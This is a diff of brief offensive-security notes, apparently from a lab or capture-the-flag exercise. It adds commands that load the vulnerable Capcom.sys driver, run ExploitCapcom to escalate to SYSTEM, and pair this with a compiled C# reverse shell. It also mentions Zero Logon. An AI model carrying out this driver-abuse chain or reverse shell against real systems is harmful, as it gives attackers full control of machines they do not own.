@@ -13,10 +13,15 @@ Driver -->compile
 https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
 
 driver exploit --> compile
-https://github.com/tandasat/ExploitCapcom
+https://github.com/tandasat/ExploitCapcom  --> add reverseshell!!!!!!
+
+-->> .\LoadDriver.exe System\CurrentControlSet\hack C:\Users\svc-print\capcom.sys
+-->> .\ExploitCapcom.exe
+
+
 
 reverse shell c#
-https://www.puckiestyle.nl/c-simple-reverse-shell/
+https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.net\framework64\v4.0.30319> .\csc.exe ---> 
 
 # ZERO_LOGON
 
